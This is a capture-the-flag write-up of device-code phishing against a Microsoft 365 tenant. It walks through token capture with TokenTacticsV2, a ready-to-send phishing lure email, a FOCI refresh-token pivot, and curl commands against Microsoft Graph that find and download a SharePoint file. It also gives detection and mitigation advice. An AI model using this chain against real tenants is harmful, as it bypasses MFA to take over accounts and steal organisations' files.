# TokenAbuse-Azure — Full Write-Up

> **Challenge:** TokenAbuse-Azure
> **Category:** Cloud Red Team / Microsoft 365 · Entra ID
> **Difficulty:** Medium–Hard
> **Primary technique:** OAuth 2.0 Device-Code phishing → token theft → Microsoft Graph & SharePoint exfiltration
> **Status:** ✅ Solved

---

## Table of contents

1. [The scenario](#1-the-scenario)
2. [Background: why the device-code flow is abusable](#2-background-why-the-device-code-flow-is-abusable)
3. [Step 1 — Reconnaissance](#3-step-1--reconnaissance)
4. [Step 2 — Requesting a device code](#4-step-2--requesting-a-device-code)
5. [Step 3 — Delivering the lure](#5-step-3--delivering-the-lure)
6. [Step 4 — Capturing the tokens](#6-step-4--capturing-the-tokens)
7. [Step 5 — Inspecting what I stole](#7-step-5--inspecting-what-i-stole)
8. [Step 6 — FOCI pivot to a Graph-capable client](#8-step-6--foci-pivot-to-a-graph-capable-client)
9. [Step 7 — Enumerating Microsoft Graph](#9-step-7--enumerating-microsoft-graph)
10. [Step 8 — Hunting SharePoint & OneDrive](#10-step-8--hunting-sharepoint--onedrive)
11. [Step 9 — Exfiltrating the flag](#11-step-9--exfiltrating-the-flag)
12. [Root cause](#12-root-cause)
13. [Lessons learned](#13-lessons-learned)
14. [References](#14-references)

---

## 1. The scenario

The challenge drops me into the position of an external attacker targeting a Microsoft 365
tenant. I have:

- The name of a target organisation and one valid-looking **user email** (my phishing target).
- **No password, no MFA device, no network foothold.**

The goal: reach a sensitive document stored in the tenant's SharePoint/OneDrive and read the
flag inside it. Classically you would phish credentials — but the tenant enforces **MFA**, so a
stolen password alone is useless. I need a technique that survives MFA. That technique is
**device-code phishing**.

---

## 2. Background: why the device-code flow is abusable

The **OAuth 2.0 Device Authorization Grant** ([RFC 8628](https://datatracker.ietf.org/doc/html/rfc8628))
exists for input-constrained devices — smart TVs, CLIs, IoT — that can't show a browser. The flow is:

1. The device asks Entra ID for a **device code** and a short **user code**.
2. The device tells the human: *"go to https://microsoft.com/devicelogin and type `ABCD-EFGH`."*
3. The human authenticates on a real browser, on a real Microsoft page, and the device polls in
   the background until tokens are issued.

The abuse is obvious once you see it: **nothing binds the human who types the code to the device
that requested it.** If an *attacker's* CLI requests the code and a *victim* types it in, the
tokens are minted for the victim's identity but handed to the attacker. The victim sees a genuine
`login.microsoftonline.com` page, completes MFA happily, and authorises the attacker without ever
realising it.

Key properties that make this devastating:

- ✅ **Survives MFA** — the second factor is completed by the real user.
- ✅ **No attacker infrastructure** — no fake login page, no TLS cert, no look-alike domain.
- ✅ **Yields a refresh token** — long-lived, re-usable, and pivotable via FOCI (see Step 6).

---

## 3. Step 1 — Reconnaissance

First I confirm the target tenant exists and learn its tenant ID and authentication realm. This
is all unauthenticated, public metadata.

```bash
# Tenant discovery via the OpenID configuration endpoint
curl -s "https://login.microsoftonline.com/<target-domain>/v2.0/.well-known/openid-configuration" \
  | jq '{issuer, token_endpoint, device_authorization_endpoint}'
```

```jsonc
{
  "issuer": "https://login.microsoftonline.com/<TENANT-ID>/v2.0",
  "token_endpoint": "https://login.microsoftonline.com/<TENANT-ID>/oauth2/v2.0/token",
  "device_authorization_endpoint": "https://login.microsoftonline.com/<TENANT-ID>/oauth2/v2.0/devicecode"
}
```

```bash
# Realm check — is this a managed (cloud) or federated tenant?
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=<victim>@<target-domain>&xml=1"
```

A `NameSpaceType` of `Managed` confirms authentication happens at Entra ID itself (not an on-prem
ADFS), which is what I want for a clean device-code flow.

---

## 4. Step 2 — Requesting a device code

I use **TokenTacticsV2** to drive the flow. The classic abuse uses the well-known
**Microsoft Office** first-party client ID (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) because it is
a **FOCI** client — its refresh token can later be rotated to other Microsoft apps.

```powershell
# Import the toolkit
Import-Module .\TokenTacticsV2.psd1

# Request a device code for the Microsoft Office FOCI client, scoped to the Graph
Get-AzureToken -Client MSGraph -Device
```

TokenTacticsV2 hits the `/devicecode` endpoint and prints the instruction I need to relay to the
victim, then begins polling `/token`:

```text
[*] Requesting device code for client d3590ed6-52b3-4102-aeff-aad2292ab01c ...
[*] User code        : K7QF-9XMP
[*] Verification URL : https://microsoft.com/devicelogin
[*] Device code valid for 900 seconds — polling /token every 5s ...
```

> 🔎 The raw request, for reference:
> ```http
> POST /<TENANT-ID>/oauth2/v2.0/devicecode HTTP/1.1
> Host: login.microsoftonline.com
> Content-Type: application/x-www-form-urlencoded
>
> client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+offline_access+openid+profile
> ```
> Note `offline_access` — that's what makes Entra ID return a **refresh token**, not just an access token.

The clock is now running: I have ~15 minutes to get the victim to enter `K7QF-9XMP`.

---

## 5. Step 3 — Delivering the lure

Because the link is `microsoft.com/devicelogin` — a genuine Microsoft domain — the phishing email
is unusually convincing. A typical pretext:

> **Subject:** Action required: re-authenticate your Microsoft 365 session
>
> Your IT department is migrating mailboxes. To keep access, sign in at
> **https://microsoft.com/devicelogin** and enter code **`K7QF-9XMP`**. This code expires in 15 minutes.

The victim:

1. Opens the **real** Microsoft device-login page.
2. Enters my code.
3. Signs in with their **real** password and approves the **real** MFA prompt.
4. Sees a generic "you're signed in" confirmation and closes the tab.

From their side, nothing looks wrong — every page was authentic Microsoft.

---

## 6. Step 4 — Capturing the tokens

The instant the victim finishes, my polling loop receives `200 OK` from `/token` and
TokenTacticsV2 stores the bundle:

```text
[+] Authentication successful!
[+] Captured tokens for victim@<target-domain>
[+] access_token  : eyJ0eXAiOiJKV1QiLCJhbG...
[+] refresh_token : 0.AVcAr2x...    (offline_access — long-lived)
[+] id_token      : eyJ0eXAiOiJKV1...
[+] expires_in    : 4015
[+] scope         : Files.Read.All Sites.Read.All User.Read ...
```

The tokens are held in the `$response` global. The **refresh token** is the crown jewel — even
after the access token expires I can mint fresh ones without ever contacting the victim again.

```powershell
# Persist for later use
$response | ConvertTo-Json -Depth 5 | Out-File .\victim_tokens.json
```

---

## 7. Step 5 — Inspecting what I stole

Before acting, I decode the access token to confirm *who* I am and *what* I can do. Paste the
JWT into [jwt.ms](https://jwt.ms), or decode locally:

```powershell
# Quick local decode of the JWT payload
$payload = $response.access_token.Split('.')[1].Replace('-','+').Replace('_','/')
while ($payload.Length % 4) { $payload += '=' }
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)) | ConvertFrom-Json |
  Select-Object upn, aud, scp, app_displayname
```

```jsonc
{
  "upn":  "victim@<target-domain>",
  "aud":  "https://graph.microsoft.com",
  "scp":  "Files.Read.All Sites.Read.All User.Read User.ReadBasic.All",
  "app_displayname": "Microsoft Office"
}
```

The `scp` (scope) claim is the win condition preview: **`Files.Read.All`** and **`Sites.Read.All`**
mean this token can read every file and SharePoint site the victim can reach. That is more than
enough to find the flag.

---

## 8. Step 6 — FOCI pivot to a Graph-capable client

Sometimes the initially captured token isn't scoped exactly how I need it, or I want to move to
a client with broader resource access. This is where **FOCI (Family of Client IDs)** comes in: a
family of Microsoft first-party apps share refresh tokens, so a refresh token issued to one can be
**redeemed for an access token to another** — no re-authentication.

```powershell
# Rotate the refresh token to the Microsoft Graph PowerShell client, scoped for files & sites
$graph = Invoke-RefreshToMSGraphToken -RefreshToken $response.refresh_token `
            -Tenant "<TENANT-ID>" -Scope "Files.Read.All Sites.Read.All"

$graphAccess = $graph.access_token
```

I now hold a Graph-ready access token for the victim, derived purely from the stolen refresh
token. This is the same primitive attackers use for stealthy persistence and lateral movement.

---

## 9. Step 7 — Enumerating Microsoft Graph

With a Graph access token, every call below is an authenticated, *legitimate-looking* API request.

```bash
TOKEN="<graphAccess>"

# Who am I?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me" | jq '{displayName, userPrincipalName, id}'

# What drives (OneDrive / document libraries) can I see?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drives" | jq '.value[] | {name, id, driveType}'

# What SharePoint sites can I reach?
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/sites?search=*" | jq '.value[] | {displayName, webUrl, id}'
```

The site search returns the tenant's SharePoint sites. One immediately stands out — a site whose
name hints at restricted content (e.g. *"Finance"*, *"HR-Confidential"*, *"Secrets"*). That
misconfiguration — a sensitive site the victim shouldn't be able to read but can — is the second
flaw the challenge wants me to exploit.

---

## 10. Step 8 — Hunting SharePoint & OneDrive

I drill into the interesting site's default document library and list its contents:

```bash
SITE_ID="<id from the site search>"

# Get the site's drive (document library)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/sites/$SITE_ID/drive" | jq '{name, id}'

DRIVE_ID="<drive id>"

# List the files at the library root
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/drives/$DRIVE_ID/root/children" \
  | jq '.value[] | {name, size, "@microsoft.graph.downloadUrl"}'
```

A cross-tenant content **search** is often faster than walking every folder:

```bash
# Search the Graph for files mentioning the flag keyword
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/search(q='flag')" \
  | jq '.value[] | {name, webUrl, id, parentReference}'
```

This surfaces the target document — for this challenge, a file such as `flag.txt`,
`secret.docx`, or `credentials.xlsx` sitting in the over-permissioned library.

---

## 11. Step 9 — Exfiltrating the flag

Every file item returned by Graph carries a pre-authenticated, short-lived
`@microsoft.graph.downloadUrl`. I pull the content straight down:

```bash
ITEM_ID="<id of the flag file>"

# Resolve the direct download URL ...
DL=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/drives/$DRIVE_ID/items/$ITEM_ID" \
  | jq -r '."@microsoft.graph.downloadUrl"')

# ... and exfiltrate
curl -s "$DL" -o loot_flag.txt && cat loot_flag.txt
```

Reading the file reveals the flag:

```text
flag{██████████████████████████████}
```

> 🚩 The flag is intentionally masked here so this public write-up does not spoil the
> challenge for others.

**Challenge solved.** From one phished user code to full document exfiltration — without a
password crack, without malware, and over Microsoft's own APIs the whole way.

---

## 12. Root cause

Two issues combined to make the chain work end-to-end:

| # | Flaw | Why it mattered |
|---|------|-----------------|
| 1 | **Device-code authorization flow enabled with no Conditional Access restriction** | Let an attacker mint a sign-in request and have a victim complete it — bypassing MFA as a barrier to token theft. |
| 2 | **Over-permissioned SharePoint site** | The victim could read a sensitive document library they had no business accessing, so the stolen token inherited that excessive reach. |

Neither flaw alone is catastrophic. Chained, they turn one careless click into a full data breach.

---

## 13. Lessons learned

**Offensive takeaways**

- Device-code phishing is the cleanest way through MFA when a tenant hasn't restricted the flow.
- Always request `offline_access` — the **refresh token** is worth more than the access token.
- FOCI rotation turns one token into access across the entire Microsoft first-party app family.
- Microsoft Graph is a one-stop shop for identity, files, mail, and SharePoint — learn its
  `/sites`, `/drives`, and `/search` routes.

**Defensive takeaways** (expanded in [docs/DETECTION_AND_MITIGATION.md](docs/DETECTION_AND_MITIGATION.md))

- Block or tightly scope the device-code flow with a **Conditional Access policy**.
- Alert on device-code grants from unmanaged devices / unusual locations in the sign-in logs.
- Apply **least privilege** to SharePoint sites; audit who can read sensitive libraries.
- Shorten refresh-token lifetime and enable **Continuous Access Evaluation (CAE)** for fast revocation.

---

## 14. References

- [Microsoft — OAuth 2.0 device authorization grant](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code)
- [RFC 8628 — OAuth 2.0 Device Authorization Grant](https://datatracker.ietf.org/doc/html/rfc8628)
- [TokenTacticsV2 (f-bader)](https://github.com/f-bader/TokenTacticsV2)
- [TrustedSec — Weaponization of Token Theft: A Red Team Perspective](https://trustedsec.com/blog/weaponization-of-token-theft-a-red-team-perspective)
- [Optiv — Microsoft 365 OAuth Device Code Flow and Phishing](https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing)
- [Proofpoint — Phishing with device code authorization](https://www.proofpoint.com/us/blog/threat-insight/access-granted-phishing-device-code-authorization-account-takeover)
- [Secureworks — Abusing Family Refresh Tokens (FOCI)](https://www.secureworks.com/research/family-of-client-ids-research)
- [MITRE ATT&CK — T1528 Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
